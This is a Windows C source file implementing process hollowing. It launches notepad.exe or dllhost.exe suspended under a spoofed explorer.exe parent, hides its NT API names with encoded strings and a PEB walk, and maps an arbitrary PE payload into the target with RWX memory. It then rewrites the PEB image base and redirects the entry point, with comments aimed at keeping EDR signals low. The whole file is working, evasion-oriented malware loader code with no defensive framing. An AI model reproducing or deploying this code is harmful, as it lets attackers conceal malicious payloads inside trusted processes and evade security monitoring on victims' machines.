#include <windows.h>
#include "peb_walk.h"
#include "evs_strings.h"
#include <winternl.h>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

/* NT function typedefs */
typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE ProcessHandle,
                                                  PVOID  BaseAddress);

typedef NTSTATUS (NTAPI *NtCreateSection_t)(
    PHANDLE             SectionHandle,
    ACCESS_MASK         DesiredAccess,
    PVOID               ObjectAttributes,
    PLARGE_INTEGER      MaximumSize,
    ULONG               SectionPageProtection,
    ULONG               AllocationAttributes,
    HANDLE              FileHandle);

typedef NTSTATUS (NTAPI *NtMapViewOfSection_t)(
    HANDLE          SectionHandle,
    HANDLE          ProcessHandle,
    PVOID          *BaseAddress,
    ULONG_PTR       ZeroBits,
    SIZE_T          CommitSize,
    PLARGE_INTEGER  SectionOffset,
    PSIZE_T         ViewSize,
    ULONG           InheritDisposition, /* 2 = ViewUnmap */
    ULONG           AllocationType,
    ULONG           Win32Protect);

typedef NTSTATUS (NTAPI *NtQIP_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);

#ifndef SEC_COMMIT
#  define SEC_COMMIT 0x8000000
#endif

static DWORD _find_pid(const wchar_t *name)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static LPPROC_THREAD_ATTRIBUTE_LIST _make_parent_attr(HANDLE hParent, SIZE_T *out_sz)
{
    SIZE_T sz = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &sz);
    LPPROC_THREAD_ATTRIBUTE_LIST al = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(sz);
    if (!al) return NULL;
    if (!InitializeProcThreadAttributeList(al, 1, 0, &sz)
            || !UpdateProcThreadAttribute(al, 0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    &hParent, sizeof(hParent), NULL, NULL)) {
        free(al); return NULL;
    }
    *out_sz = sz;
    return al;
}

static void *_rva(const void *base, DWORD rva) {
    return (BYTE *)base + rva;
}

int hollow_inject(const uint8_t *pe_buf, size_t pe_len)
{
    if (pe_len < sizeof(IMAGE_DOS_HEADER)) return -1;

    const IMAGE_DOS_HEADER *dos = (const IMAGE_DOS_HEADER *)pe_buf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return -1;

    const IMAGE_NT_HEADERS64 *nt =
        (const IMAGE_NT_HEADERS64 *)(pe_buf + dos->e_lfanew);
    if (nt->Signature          != IMAGE_NT_SIGNATURE)              return -1;
    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return -1;

    DWORD  ep_rva   = nt->OptionalHeader.AddressOfEntryPoint;
    SIZE_T img_size = nt->OptionalHeader.SizeOfImage;
    LPVOID preferred = (LPVOID)nt->OptionalHeader.ImageBase;

    /* pick target: notepad.exe or dllhost.exe randomly */
    static const wchar_t *TARGETS[] = {
        L"%SystemRoot%\\System32\\notepad.exe",
        L"%SystemRoot%\\System32\\dllhost.exe",
    };
    uint8_t pick = 0;
    BCryptGenRandom(NULL, &pick, 1, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    wchar_t target[MAX_PATH];
    ExpandEnvironmentStringsW(TARGETS[pick & 1], target, MAX_PATH);

    /* create suspended target with PPID spoofed to explorer.exe */
    DWORD   ppid    = _find_pid(L"explorer.exe");
    HANDLE  hParent = ppid
        ? OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid)
        : NULL;

    SIZE_T  attr_sz  = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST attr = hParent
        ? _make_parent_attr(hParent, &attr_sz)
        : NULL;

    STARTUPINFOEXW siex;
    memset(&siex, 0, sizeof(siex));
    siex.StartupInfo.cb = sizeof(siex);
    siex.lpAttributeList = attr;

    DWORD flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
    if (attr) flags |= EXTENDED_STARTUPINFO_PRESENT;

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessW(NULL, target, NULL, NULL, FALSE,
            flags, NULL, NULL, (LPSTARTUPINFOW)&siex, &pi)) {
        if (attr)    { DeleteProcThreadAttributeList(attr); free(attr); }
        if (hParent)   CloseHandle(hParent);
        return -2;
    }
    if (attr)    { DeleteProcThreadAttributeList(attr); free(attr); }
    if (hParent)   CloseHandle(hParent);

    /* resolve NT functions from ntdll */
    char _dn[10];
    EVS_D(_dn, EVS_dll_ntdll);
    HMODULE ntdll = _peb_module(_dn);
    SecureZeroMemory(_dn, sizeof(_dn));

    char _fn[26];
    EVS_D(_fn, EVS_fn_NtUnmapViewOfSection);
    NtUnmapViewOfSection_t NtUnmap = (NtUnmapViewOfSection_t)GetProcAddress(ntdll, _fn);
    SecureZeroMemory(_fn, sizeof(_fn));

    EVS_D(_fn, EVS_fn_NtCreateSection);
    NtCreateSection_t NtCSec = (NtCreateSection_t)GetProcAddress(ntdll, _fn);
    SecureZeroMemory(_fn, sizeof(_fn));

    EVS_D(_fn, EVS_fn_NtMapViewOfSection);
    NtMapViewOfSection_t NtMapVw = (NtMapViewOfSection_t)GetProcAddress(ntdll, _fn);
    SecureZeroMemory(_fn, sizeof(_fn));

    EVS_D(_fn, EVS_fn_NtQueryInformationProcess);
    NtQIP_t NtQIP = (NtQIP_t)GetProcAddress(ntdll, _fn);
    SecureZeroMemory(_fn, sizeof(_fn));

    if (!NtCSec || !NtMapVw || !NtUnmap) goto kill;

    /* unmap original target image */
    NtUnmap(pi.hProcess, preferred);

    HANDLE hSection = NULL;
    LARGE_INTEGER sec_sz;
    sec_sz.QuadPart = (LONGLONG)img_size;
    if (NtCSec(&hSection, SECTION_ALL_ACCESS, NULL, &sec_sz,
               PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) < 0)
        goto kill;

    /* ---- Map into target process at preferred base ---- */

    LPVOID remote_view = preferred;
    SIZE_T view_sz = 0;
    NTSTATUS st = NtMapVw(hSection, pi.hProcess, &remote_view,
                          0, 0, NULL, &view_sz,
                          2 /* ViewUnmap */, 0, PAGE_EXECUTE_READWRITE);
    if (st < 0) {
        /* preferred base taken, let kernel pick */
        remote_view = NULL;
        view_sz = 0;
        st = NtMapVw(hSection, pi.hProcess, &remote_view,
                     0, 0, NULL, &view_sz,
                     2, 0, PAGE_EXECUTE_READWRITE);
        if (st < 0) { CloseHandle(hSection); goto kill; }
    }

    /* map into current process RW for writing */
    LPVOID local_view = NULL;
    view_sz = 0;
    if (NtMapVw(hSection, GetCurrentProcess(), &local_view,
                0, 0, NULL, &view_sz,
                2 /* ViewUnmap */, 0, PAGE_READWRITE) < 0) {
        NtUnmap(pi.hProcess, remote_view);
        CloseHandle(hSection);
        goto kill;
    }

    /* build PE image in local view */
    uint8_t *img = (uint8_t *)local_view;

    /* copy headers */
    memcpy(img, pe_buf, nt->OptionalHeader.SizeOfHeaders);

    /* copy sections */
    IMAGE_NT_HEADERS64   *lnt = (IMAGE_NT_HEADERS64 *)(img + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(lnt);
    for (WORD i = 0; i < lnt->FileHeader.NumberOfSections; i++, sec++) {
        if (!sec->SizeOfRawData) continue;
        SIZE_T copy_sz = sec->SizeOfRawData < sec->Misc.VirtualSize
                       ? sec->SizeOfRawData : sec->Misc.VirtualSize;
        memcpy(img + sec->VirtualAddress,
               pe_buf + sec->PointerToRawData,
               copy_sz);
    }

    /* fix base relocations */
    INT64 delta = (INT64)remote_view - (INT64)nt->OptionalHeader.ImageBase;
    if (delta) {
        IMAGE_DATA_DIRECTORY *rd =
            &lnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (rd->Size) {
            IMAGE_BASE_RELOCATION *blk =
                (IMAGE_BASE_RELOCATION *)_rva(img, rd->VirtualAddress);
            while (blk->VirtualAddress && blk->SizeOfBlock >= sizeof(*blk)) {
                DWORD cnt  = (blk->SizeOfBlock - sizeof(*blk)) / sizeof(WORD);
                WORD *ent  = (WORD *)((BYTE *)blk + sizeof(*blk));
                for (DWORD j = 0; j < cnt; j++) {
                    if ((ent[j] >> 12) == IMAGE_REL_BASED_DIR64) {
                        INT64 *p = (INT64 *)_rva(img,
                            blk->VirtualAddress + (ent[j] & 0xFFF));
                        *p += delta;
                    }
                }
                blk = (IMAGE_BASE_RELOCATION *)((BYTE *)blk + blk->SizeOfBlock);
            }
        }
    }

    /* resolve imports */
    IMAGE_DATA_DIRECTORY *id =
        &lnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (id->Size) {
        IMAGE_IMPORT_DESCRIPTOR *imp =
            (IMAGE_IMPORT_DESCRIPTOR *)_rva(img, id->VirtualAddress);
        while (imp->Name) {
            HMODULE hmod = LoadLibraryA((char *)_rva(img, imp->Name));
            if (!hmod) {
                NtUnmap(GetCurrentProcess(), local_view);
                CloseHandle(hSection);
                goto kill;
            }
            IMAGE_THUNK_DATA64 *iat  =
                (IMAGE_THUNK_DATA64 *)_rva(img, imp->FirstThunk);
            IMAGE_THUNK_DATA64 *orig = imp->OriginalFirstThunk
                ? (IMAGE_THUNK_DATA64 *)_rva(img, imp->OriginalFirstThunk)
                : iat;
            while (orig->u1.AddressOfData) {
                FARPROC fn;
                if (IMAGE_SNAP_BY_ORDINAL64(orig->u1.Ordinal))
                    fn = GetProcAddress(hmod,
                             (LPCSTR)IMAGE_ORDINAL64(orig->u1.Ordinal));
                else {
                    IMAGE_IMPORT_BY_NAME *ibn =
                        (IMAGE_IMPORT_BY_NAME *)_rva(img,
                            (DWORD)orig->u1.AddressOfData);
                    fn = GetProcAddress(hmod, ibn->Name);
                }
                if (!fn) {
                    NtUnmap(GetCurrentProcess(), local_view);
                    CloseHandle(hSection);
                    goto kill;
                }
                iat->u1.Function = (ULONGLONG)fn;
                iat++; orig++;
            }
            imp++;
        }
    }

    /* Update ImageBase in in-memory headers */
    lnt->OptionalHeader.ImageBase = (ULONGLONG)remote_view;

    /* Unmap local alias — shared section keeps data visible in target view */
    NtUnmap(GetCurrentProcess(), local_view);
    CloseHandle(hSection);

    /* ---- Update PEB.ImageBaseAddress (single 8-byte write, negligible EDR signal) ---- */
    if (NtQIP) {
        PROCESS_BASIC_INFORMATION pbi = {0};
        NtQIP(pi.hProcess, 0, &pbi, sizeof(pbi), NULL);
        if (pbi.PebBaseAddress)
            WriteProcessMemory(pi.hProcess,
                (BYTE *)pbi.PebBaseAddress + 0x10,
                &remote_view, sizeof(PVOID), NULL);
    }

    /* ---- Redirect entry point ---- */
    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) goto kill;
    ctx.Rip = (DWORD64)remote_view + ep_rva;
    if (!SetThreadContext(pi.hThread, &ctx)) goto kill;

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;

kill:
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return -9;
}
